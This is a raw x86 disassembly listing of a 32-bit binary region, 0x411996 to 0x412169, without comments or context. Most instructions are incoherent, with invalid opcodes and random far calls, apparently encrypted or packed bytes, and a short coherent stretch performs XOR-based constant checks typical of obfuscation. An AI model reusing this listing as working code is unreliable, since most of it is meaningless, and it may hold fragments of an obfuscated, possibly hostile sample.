  411996:	mov    ds:0x7a74d011,eax
  41199b:	repz cmp al,0xb8
  41199e:	in     al,dx
  41199f:	and    eax,0x94ad0fad
  4119a4:	test   al,0xc
  4119a6:	call   0xdaeb4cc1
  4119ab:	xlat   BYTE PTR ds:[ebx]
  4119ac:	xor    edx,ebp
  4119ae:	xor    eax,edx
  4119b0:	sbb    ah,BYTE PTR [edi-0x77]
  4119b3:	pop    edi
  4119b4:	jb     0x4119ec
  4119b6:	and    al,0x8b
  4119b8:	push   ebp
  4119b9:	les    eax,FWORD PTR [ecx+0xf3af1]
  4119bf:	add    BYTE PTR [ebx],cl
  4119c1:	enter  0x68a1,0x25
  4119c5:	inc    edx
  4119c6:	add    BYTE PTR [ebx+0x1d880],cl
  4119cc:	add    BYTE PTR [ebx+0x65f68100],cl
  4119d2:	data16 add BYTE PTR [eax],al
  4119d5:	or     esi,edx
  4119d7:	add    ecx,0xef6a96a5
  4119dd:	cdq    
  4119de:	adc    esi,0xc8b6a000
  4119e4:	cmp    eax,ecx
  4119e6:	jne    0x4119f4
  4119ec:	cmp    edx,esi
  4119ee:	je     0x411f3d
  4119f4:	mov    eax,DWORD PTR [ebp-0x50]
  4119f7:	jmp    0x411c6c
  4119fc:	loope  0x4119a1
  4119fe:	lods   eax,DWORD PTR ds:[esi]
  4119ff:	aam    0xab
  411a01:	mov    edx,0xd9d49ae0
  411a06:	gs mov esp,0x7cc72d8f
  411a0c:	imul   BYTE PTR [esi+0x18]
  411a0f:	sbb    BYTE PTR [ecx+0x14],dh
  411a12:	sbb    BYTE PTR [eax],bl
  411a14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a15:	mov    edx,edx
  411a17:	loopne 0x411a95
  411a19:	sbb    BYTE PTR [ebp+0x7d],ch
  411a1c:	scas   al,BYTE PTR es:[edi]
  411a1d:	sub    edx,esp
  411a1f:	fcomi  st,st(2)
  411a21:	push   esp
  411a22:	jecxz  0x411a8e
  411a24:	stos   DWORD PTR es:[edi],eax
  411a25:	mov    ecx,0xbab30bba
  411a2a:	mov    ah,0x4b
  411a2c:	pop    eax
  411a2d:	bound  ecx,QWORD PTR [edi+0x47]
  411a30:	dec    ecx
  411a31:	nop
  411a32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a33:	or     eax,0xa083dbab
  411a38:	iret   
  411a39:	and    esp,ecx
  411a3b:	mov    ebp,0xc4814e67
  411a40:	mov    ebx,0x476ce89e
  411a45:	or     ecx,ecx
  411a47:	shl    DWORD PTR [ebx+edx*2],0x42
  411a4b:	mov    ds:0x3a499177,al
  411a50:	adc    eax,0xe7ccdbcc
  411a55:	cli    
  411a56:	stos   BYTE PTR es:[edi],al
  411a57:	xchg   ebx,eax
  411a58:	cmp    eax,edx
  411a5a:	mov    edi,0xb00e15dd
  411a5f:	fcom   QWORD PTR [edi+0xf]
  411a62:	ss and al,0xb1
  411a65:	les    esi,FWORD PTR [edi-0x75d33dfd]
  411a6b:	xor    DWORD PTR [eax],esi
  411a6d:	fwait
  411a6e:	mov    dl,0xfa
  411a70:	(bad)  
  411a71:	shl    DWORD PTR [edi+0x76],1
  411a74:	dec    esp
  411a75:	mov    ds:0x11224833,al
  411a7a:	test   BYTE PTR [edi+0x3e98ee30],cl
  411a80:	in     al,0xaf
  411a82:	push   0x40a4d3c9
  411a87:	(bad)  
  411a88:	or     ecx,DWORD PTR [ebx+eiz*1]
  411a8b:	mov    edi,0x104a0ee1
  411a90:	inc    esi
  411a91:	jg     0x411a1b
  411a93:	nop
  411a94:	xchg   esp,eax
  411a95:	push   cs
  411a96:	in     eax,dx
  411a97:	push   esp
  411a98:	and    eax,0x32910dbb
  411a9d:	popa   
  411a9e:	test   ebx,ebp
  411aa0:	mov    edi,0x7182435e
  411aa5:	add    eax,0xb8084049
  411aaa:	mov    ah,0x2b
  411aac:	mov    esp,edi
  411aae:	cmp    al,0x86
  411ab0:	int    0x32
  411ab2:	outs   dx,BYTE PTR ds:[esi]
  411ab3:	push   ss
  411ab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ab5:	into   
  411ab6:	shr    dl,1
  411ab8:	push   ds
  411ab9:	fldcw  WORD PTR [ebx-0x4e]
  411abc:	cli    
  411abd:	in     al,dx
  411abe:	push   esi
  411abf:	pop    ds
  411ac0:	data16 aad 0xc9
  411ac3:	fadd   DWORD PTR [ecx+0x6d]
  411ac6:	mov    DWORD PTR [esi],edi
  411ac8:	xor    eax,0xd849ce90
  411acd:	(bad)  
  411ace:	sbb    dh,BYTE PTR [ebx-0x1f83a2e2]
  411ad4:	xchg   DWORD PTR [esi],ebx
  411ad6:	loope  0x411b45
  411ad8:	adc    eax,0x2f136c6a
  411add:	repnz xor DWORD PTR [ecx],ebp
  411ae0:	test   al,0xef
  411ae2:	inc    edi
  411ae3:	sbb    al,0xcc
  411ae5:	daa    
  411ae6:	sub    esi,edi
  411ae8:	clc    
  411ae9:	das    
  411aea:	jge    0x411a83
  411aec:	push   ecx
  411aed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411aee:	loop   0x411abe
  411af0:	mov    esi,0x1ac23e6a
  411af5:	mov    esi,ebx
  411af7:	or     al,0xb7
  411af9:	gs aam 0x35
  411afc:	es jle 0x411b6e
  411aff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b00:	mov    DWORD PTR ds:0x2ea35f15,eax
  411b06:	ss mov esp,0x208b835d
  411b0c:	hlt    
  411b0d:	and    al,0x1
  411b0f:	sub    dl,BYTE PTR [eax-0x3125c0b9]
  411b15:	pop    es
  411b16:	or     al,0x5b
  411b18:	fstp   DWORD PTR [edx-0x7564f36e]
  411b1e:	mov    ebp,0x35ce1cd3
  411b23:	out    dx,al
  411b24:	mov    WORD PTR [esi-0x14],ss
  411b27:	pop    edi
  411b28:	adc    esp,eax
  411b2a:	rol    DWORD PTR [ebx-0x36],0xf1
  411b2e:	add    BYTE PTR [esi],ah
  411b30:	lds    esp,FWORD PTR [ebx-0x25]
  411b33:	push   ebx
  411b34:	inc    edx
  411b35:	test   eax,0xd8ce864d
  411b3a:	jecxz  0x411b28
  411b3c:	xchg   DWORD PTR [edx+0x3e410706],edx
  411b42:	jle    0x411ad6
  411b44:	push   esp
  411b45:	loopne 0x411b39
  411b47:	ss mov eax,0x77ab7458
  411b4d:	xlat   BYTE PTR ds:[ebx]
  411b4e:	adc    BYTE PTR [edx+0x3d],ah
  411b51:	pop    es
  411b52:	push   ebp
  411b53:	mov    al,ds:0xcea01992
  411b58:	and    edi,DWORD PTR [ebx+0x5d958b39]
  411b5e:	push   edx
  411b5f:	jg     0x411b3f
  411b61:	or     eax,0x368fc645
  411b66:	neg    DWORD PTR [eax]
  411b68:	ja     0x411b7b
  411b6a:	scas   eax,DWORD PTR es:[edi]
  411b6b:	push   ds
  411b6c:	and    ebx,esp
  411b6e:	or     ebp,DWORD PTR [ebx]
  411b70:	mov    cl,BYTE PTR [ebx]
  411b72:	sub    DWORD PTR [eax-0xe],ebx
  411b75:	int    0x7e
  411b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b78:	xchg   ecx,eax
  411b79:	and    DWORD PTR [ecx+0x7b],0xc812a2af
  411b80:	int3   
  411b81:	sub    eax,0x211e95db
  411b86:	in     eax,0x42
  411b88:	lahf   
  411b89:	add    DWORD PTR [ecx+0x39],esi
  411b8c:	mov    esi,DWORD PTR ds:0x692abed
  411b92:	sbb    DWORD PTR [ebp+0x2d699821],0x90f62123
  411b9c:	mov    edi,0x31e15dcd
  411ba1:	shr    ebx,0xe5
  411ba4:	add    ebx,ebp
  411ba6:	in     al,0x66
  411ba8:	neg    DWORD PTR [eax]
  411baa:	std    
  411bab:	fisub  DWORD PTR [ecx+0x4a80caa3]
  411bb1:	jno    0x411b57
  411bb3:	xor    BYTE PTR [edx],ch
  411bb5:	ins    DWORD PTR es:[edi],dx
  411bb6:	call   0x5f394c84
  411bbb:	lea    esi,[ecx-0x765e78a0]
  411bc1:	dec    ebp
  411bc2:	aas    
  411bc3:	push   eax
  411bc4:	jge    0x411bb3
  411bc6:	dec    esi
  411bc7:	ss and al,0xce
  411bca:	cs loopne 0x411be6
  411bcd:	or     eax,0x89d64898
  411bd2:	dec    edi
  411bd3:	fisubr WORD PTR [ebx+0x61]
  411bd6:	push   es
  411bd7:	push   es
  411bd8:	icebp  
  411bd9:	xchg   edi,eax
  411bdb:	xor    eax,0xdf05b5d8
  411be0:	icebp  
  411be1:	adc    eax,0x93f865df
  411be6:	lods   al,BYTE PTR ds:[esi]
  411be7:	inc    ebx
  411be8:	jecxz  0x411b95
  411bea:	inc    edi
  411beb:	push   edx
  411bec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bed:	pushf  
  411bee:	imul   esp,esp,0x23ffa9a4
  411bf4:	xlat   BYTE PTR ds:[ebx]
  411bf5:	das    
  411bf6:	add    al,0x66
  411bf8:	clc    
  411bf9:	mov    dh,BYTE PTR [edx-0x43]
  411bfc:	nop
  411bfd:	mov    ?,ebx
  411bff:	hlt    
  411c00:	push   esp
  411c01:	adc    DWORD PTR [ebx+esi*2+0x71f567d0],edi
  411c08:	or     BYTE PTR [ecx-0x49],dh
  411c0b:	jbe    0x411c7f
  411c0d:	pushf  
  411c0e:	and    dl,ch
  411c10:	ja     0x411c0f
  411c12:	nop
  411c13:	xchg   edi,eax
  411c14:	and    eax,0xb0397590
  411c19:	stos   DWORD PTR es:[edi],eax
  411c1a:	xor    eax,DWORD PTR [esi]
  411c1c:	sub    BYTE PTR [edi+0x2880a714],dh
  411c22:	test   BYTE PTR [eax],al
  411c24:	inc    ebx
  411c25:	shl    BYTE PTR [esi-0xa],0x86
  411c29:	arpl   WORD PTR [ebx-0x67],sp
  411c2c:	rcr    esp,0xc9
  411c2f:	and    DWORD PTR [ebx+0x1a],ebp
  411c32:	in     eax,0x0
  411c34:	xor    esp,DWORD PTR [ecx-0x16f97635]
  411c3a:	push   0xd5373f44
  411c3f:	mov    ?,esi
  411c41:	outs   dx,DWORD PTR ds:[esi]
  411c42:	(bad)  
  411c43:	mov    WORD PTR [ecx-0x55],?
  411c46:	out    0xcc,al
  411c48:	fadd   QWORD PTR [ebx+0x5c]
  411c4b:	xchg   edx,eax
  411c4c:	je     0x411c18
  411c4e:	jg     0x411bd6
  411c50:	cli    
  411c51:	pop    ebx
  411c52:	mov    al,ds:0x9788d6fd
  411c57:	dec    esp
  411c58:	or     al,0xeb
  411c5a:	stos   DWORD PTR es:[edi],eax
  411c5b:	clc    
  411c5c:	mov    ebp,0xeed137ba
  411c61:	rcl    BYTE PTR [edx+0x69],cl
  411c64:	fwait
  411c65:	pop    esp
  411c66:	(bad)  
  411c67:	adc    DWORD PTR [ecx],edi
  411c69:	xor    eax,0x4d8b9c89
  411c6e:	mov    ah,0x8b
  411c70:	push   ebp
  411c71:	mov    al,ds:0x5a4758b
  411c76:	sbb    BYTE PTR [eax+0x0],bh
  411c79:	add    BYTE PTR [ecx+0x87d1],al
  411c7f:	add    BYTE PTR [ebx],cl
  411c81:	ret    0x558b
  411c84:	nop
  411c85:	jmp    0x411efa
  411c8a:	pop    ebp
  411c8b:	and    DWORD PTR [esi],esi
  411c8d:	xor    bh,BYTE PTR ds:[esi]
  411c90:	pop    ebp
  411c91:	sbb    bh,BYTE PTR [edi+edi*8+0x3c6d6a08]
  411c98:	aas    
  411c99:	mov    esi,0x18186a4f
  411c9e:	jno    0x411cb4
  411ca0:	sbb    BYTE PTR [eax],bl
  411ca2:	xor    bl,cl
  411ca4:	mov    dh,0xf6
  411ca6:	sbb    eax,DWORD PTR [esi-0x26]
  411ca9:	mul    BYTE PTR [esi+0xab342f7]
  411caf:	xchg   ebp,eax
  411cb0:	sbb    BYTE PTR [ebx+0x650cf9ef],0x51
  411cb7:	push   ecx
  411cb8:	jmp    0x411d2e
  411cba:	iret   
  411cbb:	pop    edx
  411cbc:	add    eax,0xe0f3eb01
  411cc1:	or     BYTE PTR [edx+0x1d],bl
  411cc4:	cdq    
  411cc5:	not    BYTE PTR [eax]
  411cc7:	xor    eax,DWORD PTR [edx-0x47]
  411cca:	xchg   ecx,eax
  411ccb:	popa   
  411ccc:	mov    bh,0xe
  411cce:	cmc    
  411ccf:	xor    DWORD PTR [ebx-0x1c],esp
  411cd2:	mov    esp,0x1f812578
  411cd7:	mov    esp,0x8dca2a99
  411cdc:	or     esi,ebp
  411cde:	xchg   DWORD PTR [esi],ecx
  411ce0:	(bad)  
  411ce1:	jecxz  0x411c88
  411ce3:	mov    al,0xd7
  411ce5:	outs   dx,DWORD PTR ds:[esi]
  411ce6:	adc    ch,BYTE PTR [ebx+0x29]
  411ce9:	jbe    0x411c93
  411ceb:	jb     0x411c7e
  411ced:	dec    ecx
  411cee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cef:	push   eax
  411cf0:	push   es
  411cf1:	ins    DWORD PTR es:[edi],dx
  411cf2:	fld    TBYTE PTR [ebp+0x14]
  411cf5:	test   BYTE PTR [eax+0x64047408],bl
  411cfb:	test   BYTE PTR [esi-0x7c7f976],dl
  411d01:	not    BYTE PTR [edi]
  411d03:	add    edi,DWORD PTR [ebx]
  411d05:	lods   al,BYTE PTR ds:[esi]
  411d06:	test   dl,al
  411d08:	inc    bx
  411d0a:	(bad)  
  411d0b:	xlat   BYTE PTR ds:[ebx]
  411d0c:	mov    edx,0x42f5bb21
  411d11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d12:	mov    ds:0x7e1aa742,eax
  411d17:	inc    ecx
  411d18:	test   BYTE PTR [ecx-0x4a],ch
  411d1b:	mov    edx,0x1dbabd02
  411d20:	xchg   ebx,eax
  411d21:	pop    edx
  411d22:	stos   DWORD PTR es:[edi],eax
  411d23:	add    ebp,edi
  411d25:	pop    ecx
  411d26:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d28:	out    dx,al
  411d29:	mov    eax,0x733079a7
  411d2e:	mov    DWORD PTR [ecx+0x321ed758],esi
  411d34:	xchg   edx,eax
  411d35:	push   edi
  411d36:	stos   DWORD PTR es:[edi],eax
  411d37:	es loop 0x411cce
  411d3a:	mov    bl,0xfe
  411d3c:	pop    esp
  411d3d:	cmp    al,0xd0
  411d3f:	cwde   
  411d40:	retf   
  411d41:	or     bl,dh
  411d43:	shr    BYTE PTR [esi+0x1f],cl
  411d46:	ins    BYTE PTR es:[edi],dx
  411d47:	jl     0x411d02
  411d49:	inc    edi
  411d4a:	lods   al,BYTE PTR ds:[esi]
  411d4b:	dec    BYTE PTR [ebx-0x2]
  411d4e:	test   ebp,ebx
  411d50:	call   0x1996fa37
  411d55:	xchg   esp,eax
  411d56:	fdiv   st,st(3)
  411d58:	mul    BYTE PTR [edi]
  411d5a:	adc    eax,0x5337b3ec
  411d5f:	jmp    0x411d38
  411d61:	pop    ds
  411d62:	cmp    eax,0x724b7737
  411d67:	rol    BYTE PTR [eax],0xb4
  411d6a:	js     0x411cfc
  411d6c:	xchg   ecx,eax
  411d6d:	outs   dx,DWORD PTR ds:[esi]
  411d6e:	add    BYTE PTR [edi],bl
  411d70:	xor    al,dh
  411d72:	inc    ebx
  411d73:	loop   0x411d1c
  411d75:	inc    esp
  411d76:	call   0xf7de1026
  411d7b:	push   ebx
  411d7c:	into   
  411d7d:	xchg   esi,eax
  411d7e:	mov    ecx,0xcba1e104
  411d83:	jno    0x411d42
  411d85:	lahf   
  411d86:	jo     0x411dc0
  411d88:	jne    0x411db4
  411d8a:	xor    esi,DWORD PTR [esi-0x1b]
  411d8d:	fnstenv [edx+0x75d087d3]
  411d93:	int3   
  411d94:	cwde   
  411d95:	mov    al,0xc7
  411d97:	jo     0x411d23
  411d99:	and    esp,DWORD PTR [edx+0x42e0a203]
  411d9f:	fdiv   st,st(1)
  411da1:	push   es
  411da2:	iret   
  411da3:	fadd   DWORD PTR [eax]
  411da5:	outs   dx,DWORD PTR ds:[esi]
  411da6:	cmp    al,0xc1
  411da8:	cld    
  411da9:	repz hlt 
  411dab:	mov    ds:0x9828c5a6,al
  411db0:	mov    ds:0xf7806cb3,al
  411db5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411db6:	call   0xc3b050a9
  411dbb:	xor    DWORD PTR gs:[edi+0x6e110fae],ebp
  411dc2:	mov    DWORD PTR [edx-0x5ae9624f],esi
  411dc8:	xchg   BYTE PTR [ebp+eiz*2-0x6480acad],bl
  411dcf:	or     ah,ah
  411dd1:	or     BYTE PTR [eax+0x4c],ah
  411dd4:	and    DWORD PTR es:[ebx+0x61edccb9],ebx
  411ddb:	dec    edi
  411ddc:	clc    
  411ddd:	sub    BYTE PTR [ecx-0x34],al
  411de0:	data16 stc 
  411de2:	daa    
  411de3:	mov    esi,0xf2ca021
  411de8:	pop    edx
  411de9:	test   BYTE PTR [esi-0x27],al
  411dec:	hlt    
  411ded:	jae    0x411d6f
  411def:	and    ebx,DWORD PTR [ebp-0x6fb9320b]
  411df5:	add    ax,0xe0a6
  411df9:	int3   
  411dfa:	scas   al,BYTE PTR es:[edi]
  411dfb:	lea    ebx,[edx+0x58]
  411dfe:	dec    ebx
  411dff:	cdq    
  411e00:	mov    cl,0x75
  411e02:	pop    ecx
  411e03:	ret    0xa4ab
  411e06:	adc    al,0xef
  411e08:	cmp    al,BYTE PTR [esi]
  411e0a:	les    ebx,FWORD PTR [ecx]
  411e0c:	mov    ds,WORD PTR [eax+0x79]
  411e0f:	icebp  
  411e10:	add    ebp,DWORD PTR [edi-0x5d0f017d]
  411e16:	iret   
  411e17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e18:	inc    eax
  411e19:	pop    ss
  411e1a:	cmp    DWORD PTR [edx-0x5d],ebp
  411e1d:	pop    edi
  411e1e:	jae    0x411e88
  411e20:	xor    ecx,0xd7b4a9de
  411e26:	aam    0xdf
  411e28:	mov    ds:0xb7921a99,eax
  411e2d:	mov    bl,0x14
  411e2f:	xlat   BYTE PTR ds:[ebx]
  411e30:	fstp   TBYTE PTR [eax]
  411e32:	ficom  WORD PTR [esi+0x5877cd0d]
  411e38:	push   si
  411e3a:	inc    esp
  411e3b:	ror    DWORD PTR [esi+0x4a],1
  411e3e:	int    0xa5
  411e40:	stc    
  411e41:	cmp    DWORD PTR ds:0xbcc63087,0x2a
  411e48:	pop    ebp
  411e49:	ja     0x411e7e
  411e4b:	add    edi,ebp
  411e4d:	and    bl,al
  411e4f:	(bad)  
  411e50:	add    BYTE PTR [eax+0x639e0b9f],bl
  411e56:	test   DWORD PTR [ebp-0x6ddbe18b],edi
  411e5c:	ja     0x411df5
  411e5e:	bound  eax,QWORD PTR [eax+ebx*1-0x20]
  411e62:	cwde   
  411e63:	sbb    ah,bl
  411e65:	push   edx
  411e66:	hlt    
  411e67:	(bad)  
  411e69:	dec    esp
  411e6a:	cmp    eax,0x45fdad9a
  411e6f:	(bad)  
  411e70:	cmp    eax,DWORD PTR [edx]
  411e72:	push   edx
  411e73:	out    dx,al
  411e74:	mov    ebp,0x381f7862
  411e79:	add    ebp,DWORD PTR [eax+0x2e5d66f3]
  411e7f:	call   0x3b331750
  411e84:	(bad)  
  411e85:	mov    ds:0x569af1d3,al
  411e8a:	(bad)  [ebx+0x2fbd8b87]
  411e90:	inc    eax
  411e91:	es xor eax,0xcc5de265
  411e97:	rol    DWORD PTR [esi+0x55dfcb85],cl
  411e9d:	scas   eax,DWORD PTR es:[edi]
  411e9e:	test   esi,eax
  411ea0:	xor    eax,0x7e443d35
  411ea5:	stos   BYTE PTR es:[edi],al
  411ea6:	xor    cl,bl
  411ea8:	inc    ecx
  411ea9:	inc    eax
  411eaa:	push   esi
  411eab:	icebp  
  411eac:	(bad)  [edi]
  411eae:	add    cl,BYTE PTR [eax]
  411eb0:	dec    esp
  411eb1:	xor    DWORD PTR [edx],edi
  411eb3:	scas   eax,DWORD PTR es:[edi]
  411eb4:	stos   DWORD PTR es:[edi],eax
  411eb5:	(bad)  
  411eb6:	daa    
  411eb7:	jecxz  0x411ed2
  411eb9:	mov    dh,0x18
  411ebb:	out    0x3d,eax
  411ebd:	mov    cl,0xf0
  411ebf:	js     0x411e8b
  411ec1:	or     al,0x2e
  411ec3:	jg     0x411e5c
  411ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ec6:	popa   
  411ec7:	xor    dl,BYTE PTR [edi+eiz*4-0xd]
  411ecb:	call   0xbeb4:0xeb359912
  411ed2:	cli    
  411ed3:	imul   edi,ebx,0x82e14d9f
  411ed9:	test   DWORD PTR [ecx],esp
  411edb:	stos   BYTE PTR es:[edi],al
  411edc:	mov    ecx,0x71beadd4
  411ee1:	dec    ebx
  411ee2:	rol    DWORD PTR [edx-0x574e187d],0xc9
  411ee9:	or     eax,0x417a3559
  411eee:	clc    
  411eef:	ficomp DWORD PTR [esi-0x75]
  411ef2:	jmp    0xb7b867a4
  411ef7:	xor    DWORD PTR [ecx-0x7431f4f0],ecx
  411efd:	jne    0x411e93
  411eff:	push   esi
  411f00:	push   edx
  411f01:	push   ecx
  411f02:	push   eax
  411f03:	call   0x416c20
  411f08:	mov    ecx,DWORD PTR [ebp-0x80]
  411f0b:	mov    esi,DWORD PTR [ebp-0x7c]
  411f0e:	and    eax,ecx
  411f10:	mov    ecx,DWORD PTR ds:0x422568
  411f16:	mov    ecx,DWORD PTR [ecx+0x1d0]
  411f1c:	mov    ecx,DWORD PTR [ecx]
  411f1e:	and    edx,esi
  411f20:	xor    eax,0x2b01
  411f25:	xor    edx,0x2021
  411f2b:	xor    esi,esi
  411f2d:	cmp    ecx,eax
  411f2f:	jne    0x4127da
  411f35:	cmp    esi,edx
  411f37:	jne    0x4127da
  411f3d:	mov    eax,DWORD PTR [ebp-0xa4]
  411f43:	mov    ecx,DWORD PTR [ebp-0xc]
  411f46:	add    eax,0x80ca
  411f4b:	or     eax,ecx
  411f4d:	mov    ecx,DWORD PTR ds:0x422604
  411f53:	or     eax,0x686
  411f58:	xor    eax,0x3eec
  411f5d:	lea    eax,[eax+ecx*1-0xc11b]
  411f64:	xor    DWORD PTR ds:0x4225fc,eax
  411f6a:	mov    eax,DWORD PTR [ebp-0x64]
  411f6d:	and    eax,0x4dff
  411f72:	add    eax,DWORD PTR [ebp-0x14]
  411f75:	mov    ecx,DWORD PTR [ebp-0x94]
  411f7b:	xor    eax,0x676c
  411f80:	xor    edx,edx
  411f82:	div    ecx
  411f84:	mov    ecx,DWORD PTR [ebp-0x24]
  411f87:	mov    edx,DWORD PTR [ebp-0x74]
  411f8a:	xor    ecx,0x6e1e
  411f90:	imul   ecx,edx
  411f93:	mov    edx,DWORD PTR [ebp+0x8]
  411f96:	push   0x4
  411f98:	jmp    0x41220d
  411f9d:	mov    gs,WORD PTR [esp+ecx*4-0x7c]
  411fa1:	push   0x64
  411fa3:	jle    0x411fff
  411fa5:	inc    ebp
  411fa6:	inc    ecx
  411fa7:	jne    0x412025
  411fa9:	xor    al,0xf5
  411fab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fac:	mov    esp,0x181866a6
  411fb1:	jno    0x411fc7
  411fb3:	sbb    BYTE PTR [eax],bl
  411fb5:	push   ecx
  411fb6:	outs   dx,BYTE PTR ds:[esi]
  411fb7:	inc    eax
  411fb8:	loope  0x411ffd
  411fba:	pop    ecx
  411fbb:	inc    ecx
  411fbc:	aad    0x73
  411fbe:	mov    ch,0xbc
  411fc0:	push   eax
  411fc1:	nop
  411fc2:	std    
  411fc3:	rol    ecx,cl
  411fc5:	or     bl,BYTE PTR [ecx+esi*8]
  411fc8:	sbb    BYTE PTR [eax-0x7cd736b9],dh
  411fce:	loop   0x411fd5
  411fd0:	mov    dl,0x2a
  411fd2:	add    DWORD PTR [edx-0x7163ebf9],0xfffffffc
  411fd9:	jp     0x41200a
  411fdb:	je     0x41201b
  411fdd:	mov    ebx,0xe8289d
  411fe2:	jbe    0x41205e
  411fe4:	push   ecx
  411fe5:	cdq    
  411fe6:	xchg   esp,eax
  411fe7:	arpl   WORD PTR [eax],cx
  411fe9:	aad    0xbd
  411feb:	cmp    ebx,edi
  411fed:	out    dx,al
  411fee:	or     al,0x99
  411ff0:	push   edx
  411ff1:	adc    ebp,ebx
  411ff3:	mov    BYTE PTR [esp+edx*4+0x57],al
  411ff7:	ins    BYTE PTR es:[edi],dx
  411ff8:	fistp  DWORD PTR [eax-0x2]
  411ffb:	ror    DWORD PTR [edi-0x24],1
  411ffe:	sub    ecx,ecx
  412000:	enter  0xe95,0x18
  412004:	neg    DWORD PTR [ebx-0x55]
  412007:	push   ebx
  412008:	sbb    eax,0x620eace
  41200d:	and    eax,0x5a3be1d8
  412012:	bound  esp,QWORD PTR [eax-0x76686695]
  412018:	jmp    0xf7017e1e
  41201d:	mov    ds:0x808b1cf4,eax
  412022:	inc    ebp
  412024:	push   cs
  412025:	pusha  
  412026:	push   ds
  412027:	cmp    ecx,esp
  412029:	fbld   TBYTE PTR [ebx+0x2891e9dc]
  41202f:	sbb    eax,0xdbfa404
  412034:	and    eax,0xf14c357
  412039:	jmp    0x7dd77188
  41203e:	mov    bl,0xaf
  412040:	add    al,0x90
  412042:	in     eax,dx
  412043:	inc    edx
  412044:	xchg   edx,eax
  412045:	pop    esi
  412046:	scas   eax,DWORD PTR es:[edi]
  412047:	cld    
  412048:	push   ebx
  412049:	mov    cl,ch
  41204b:	retf   0x2c92
  41204e:	pusha  
  41204f:	call   0xe537:0xa27cb458
  412056:	out    0xe4,eax
  412058:	mov    es,WORD PTR [esi-0x6]
  41205b:	pop    esp
  41205c:	(bad)  
  41205d:	mov    bl,0x2f
  41205f:	jmp    FWORD PTR [ebp+edi*1-0x66]
  412063:	loope  0x4120e3
  412065:	cmc    
  412066:	fild   QWORD PTR [esi+esi*4+0x805b15d]
  41206d:	jmp    0x41206a
  41206f:	test   DWORD PTR [edx],esi
  412071:	xchg   ecx,eax
  412072:	neg    BYTE PTR [edx]
  412074:	and    esi,DWORD PTR [ecx]
  412076:	je     0x412041
  412078:	mov    ebp,edx
  41207a:	std    
  41207b:	cld    
  41207c:	cdq    
  41207d:	push   eax
  41207e:	jo     0x41203f
  412080:	loope  0x412089
  412082:	loop   0x412020
  412084:	stc    
  412085:	rcr    BYTE PTR [eax+0x63],cl
  412088:	mov    ah,0xf2
  41208a:	sti    
  41208b:	add    BYTE PTR [esi-0x8c5b2d0],ch
  412091:	out    0x6f,al
  412093:	pop    ebp
  412094:	icebp  
  412095:	sub    dl,BYTE PTR [edx]
  412097:	xchg   esp,eax
  412098:	dec    ecx
  412099:	int    0x10
  41209b:	imul   ecx,esp,0xffffffd5
  41209e:	int3   
  41209f:	mov    ds:0x314747cc,eax
  4120a4:	call   0x82f2fb7b
  4120a9:	add    DWORD PTR [edi+0x14],ecx
  4120ac:	push   edi
  4120ad:	dec    ebp
  4120ae:	jnp    0x412048
  4120b0:	mov    al,ds:0x2b6ca51a
  4120b5:	sbb    edx,DWORD PTR [eax-0x75]
  4120b8:	mov    esp,0xd1e7f4a3
  4120bd:	popa   
  4120be:	sbb    eax,0x61ab707f
  4120c3:	mov    edx,0xc6d43401
  4120c8:	xchg   edx,eax
  4120c9:	adc    bh,BYTE PTR [ebx+0x7e8a5051]
  4120cf:	pop    ecx
  4120d0:	xor    DWORD PTR [ebx+0x45e7cfef],ecx
  4120d6:	cmp    BYTE PTR [ecx],bl
  4120d8:	aad    0x2
  4120da:	adc    eax,0x1610d943
  4120df:	dec    ebp
  4120e0:	sub    eax,0xf0518bfa
  4120e5:	ret    0x431f
  4120e8:	cmp    al,0xee
  4120ea:	sbb    al,0xa8
  4120ec:	sbb    BYTE PTR [ebx],ah
  4120ee:	mov    ch,0x60
  4120f0:	ja     0x41213c
  4120f2:	outs   dx,DWORD PTR ds:[esi]
  4120f3:	add    bh,bh
  4120f5:	inc    esi
  4120f6:	push   cs
  4120f7:	push   ss
  4120f8:	clc    
  4120f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120fa:	fisubr WORD PTR [eax]
  4120fc:	cmp    DWORD PTR [ecx+0x71],0x7e
  412100:	and    eax,0xc0da40
  412105:	jle    0x4120a6
  412107:	addr16 out 0x51,al
  41210a:	and    BYTE PTR ds:0xdbef709c,bh
  412110:	(bad)  
  412111:	cmp    eax,0x48aef501
  412116:	gs mov esi,0x5e04091c
  41211c:	cmp    al,0xb9
  41211e:	xchg   edx,eax
  41211f:	xlat   BYTE PTR ds:[ebx]
  412120:	sbb    cl,dl
  412122:	pop    ebp
  412123:	(bad)  
  412124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412125:	jmp    0x41217b
  412127:	out    dx,al
  412128:	out    0x92,al
  41212a:	and    ah,dl
  41212c:	mov    esi,0xd1861fff
  412131:	adc    al,0x57
  412133:	js     0x41217b
  412135:	aad    0xbd
  412137:	adc    al,0x18
  412139:	loopne 0x412141
  41213b:	(bad)  
  41213c:	xor    DWORD PTR [edx-0x32],ebp
  41213f:	test   BYTE PTR [ebx-0x67],bh
  412142:	outs   dx,DWORD PTR ds:[esi]
  412143:	push   ecx
  412144:	dec    ebp
  412145:	mov    ds:0x12031e5e,al
  41214a:	push   edi
  41214b:	mov    BYTE PTR [eax-0x52],cl
  41214e:	cmp    cl,BYTE PTR [ebx-0x14]
  412151:	push   ds
  412152:	test   al,0xfc
  412154:	push   0xffffffe6
  412156:	dec    ecx
  412157:	ds (bad) 
  412159:	mov    cr6,ebx
  41215c:	shr    DWORD PTR [esi+0x78afec0f],cl
  412162:	call   0x2ab0:0x3e473af0
  412169:	inc    ecx
